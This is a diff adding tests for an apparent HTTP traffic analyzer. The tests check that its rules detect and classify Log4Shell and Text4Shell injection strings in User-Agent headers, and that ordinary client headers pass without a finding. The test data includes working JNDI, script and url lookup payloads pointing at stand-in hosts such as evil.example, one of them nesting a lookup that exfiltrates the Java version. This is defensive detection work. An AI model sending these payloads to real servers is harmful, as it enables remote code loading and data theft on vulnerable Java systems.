+    raw = _lk(b"User-Agent", b"${${lower:j}ndi:dns://evil.example:1389/a}")
+    f = [x for x in _ex(raw) if x.code == "HTTP-091"][0]
+    e = f.evidence
+    check("HTTP-091 labels the carrier", e["carrier"] == "header:user-agent")
+    check("HTTP-091 marks it obfuscated", e["obfuscated"] is True)
+    check("HTTP-091 reports the scheme as an IOC", e["scheme"] == "dns")
+    check("HTTP-091 reports the endpoint as an IOC",
+          e["endpoint"] == "evil.example:1389")
+    check("HTTP-091 downgrades the dns scheme to high",
+          e["severity_class"] == "high")
+    check("HTTP-091 records which grammar features were used",
+          "nested_name" in e["features"])
+    check("HTTP-091 names the other lookups seen", "lower" in e["lookups_seen"])
+    check("HTTP-091 digests the carrier",
+          e["carrier_digest"].startswith("sha256:"))
+    check("HTTP-091 says delivery attempt, not compromise",
+          "delivery attempt" in e["note"])
+    check("HTTP-091 warns that scanning noise is expected",
+          "background noise" in e["note"])
+    f = [x for x in _ex(_lk(b"User-Agent", JNDI)) if x.code == "HTTP-091"][0]
+    check("HTTP-091 marks a literal as not obfuscated",
+          f.evidence["obfuscated"] is False)
+    check("HTTP-091 ldap scheme stays critical",
+          f.evidence["severity_class"] == "critical")
+    # exfiltration lookups are named, never resolved
+    f = [x for x in _ex(_lk(b"User-Agent",
+                            b"${jndi:ldap://h/${sys:java.version}}"))
+         if x.code == "HTTP-091"][0]
+    check("HTTP-091 names a nested exfiltration lookup",
+          "sys" in f.evidence["lookups_seen"]
+          and f.evidence["nested_in_argument"] is True)
+    # commons-text evidence
+    import base64 as _b64
+    b = _b64.b64encode(b"${script:js:1}")
+    f = [x for x in _ex(_lk(b"User-Agent", b"${base64Decoder:" + b + b"}"))
+         if x.code == "HTTP-092"][0]
+    check("HTTP-092 records the decoder chain",
+          f.evidence["decoder_layers"] == "base64Decoder")
+    check("HTTP-092 names the script engine only",
+          f.evidence["script_engine"] == "js")
+    check("HTTP-092 classes script as critical",
+          f.evidence["severity_class"] == "critical")
+    f = [x for x in _ex(_lk(b"User-Agent", b"${url:UTF-8:http://evil/x}"))
+         if x.code == "HTTP-092"][0]
+    check("HTTP-092 classes url as high", f.evidence["severity_class"] == "high")
+    f = [x for x in _ex(_lk(b"User-Agent", b"${dns:address|evil.example}"))
+         if x.code == "HTTP-092"][0]
+    check("HTTP-092 classes dns as medium",
+          f.evidence["severity_class"] == "medium")
+    check("HTTP-092 records the dns query name",
+          f.evidence["dns_query"] == "address|evil.example")
+
+
+def test_lookup_real_client_corpus():
+    """Real client headers must never fire."""
+    corpus = [
+        b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+        b"(KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+        b"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
+        b" (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
+        b"curl/8.5.0", b"python-requests/2.32.3", b"Go-http-client/2.0",
+        b"okhttp/4.12.0", b"PostmanRuntime/7.39.0",
+        b"Apache-HttpClient/4.5.14 (Java/17.0.9)",
+        b"Java/21.0.1", b"axios/1.7.2", b"node-fetch/3.3.2",
+        b"Datadog Agent/7.52.0", b"Prometheus/2.51.0",
+        b"GoogleHC/1.0", b"ELB-HealthChecker/2.0",
+        b"kube-probe/1.29", b"Amazon CloudFront",
+        # shapes that merely look templated
+        b"client/${VERSION}", b"build ${CI_COMMIT_SHA}",
+        b"${project.version}", b"Mozilla/5.0 $$ {jndi}",
+        b"a${b}c", b"${}", b"${:}", b"${:-}", b"$${}",
+    ]
+    for ua in corpus:
+        got = {f.code for f in _ex(_lk(b"User-Agent", ua))}
+        check(f"no lookup finding on the real client header {ua[:44]!r} "
+              f"(got {sorted(got)})",
+              not ({"HTTP-091", "HTTP-092"} & got))
+
+
+def test_lookup_registry():
+    for code, cves in [("HTTP-091", {"CVE-2021-44228", "CVE-2021-45046"}),
+                       ("HTTP-092", {"CVE-2022-42889"})]:
+        d = hw.FINDING_REGISTRY[code]
+        check(f"{code} is tier E", d.tier == "E")
+        check(f"{code} carries its CVEs", set(d.cves) == cves)
+    check("HTTP-089 is tier F", hw.FINDING_REGISTRY["HTTP-089"].tier == "F")
+    for cve in ("CVE-2021-45105", "CVE-2021-44832"):
+        check(f"{cve} is recorded as deferred", cve in hw.DEFERRED_CVES)
+    check("the recursion DoS is deferred for being below the bar",
+          "below" in hw.DEFERRED_CVES["CVE-2021-45105"])
+    check("Text4Shell is recorded as not in KEV",
+          hw.CVE_CATALOG["CVE-2022-42889"]["kev"] is False)
+    check("Log4Shell is recorded as KEV with its date",
+          hw.CVE_CATALOG["CVE-2021-44228"]["kev_added"] == "2021-12-10")
 
 
 def test_record_shape():
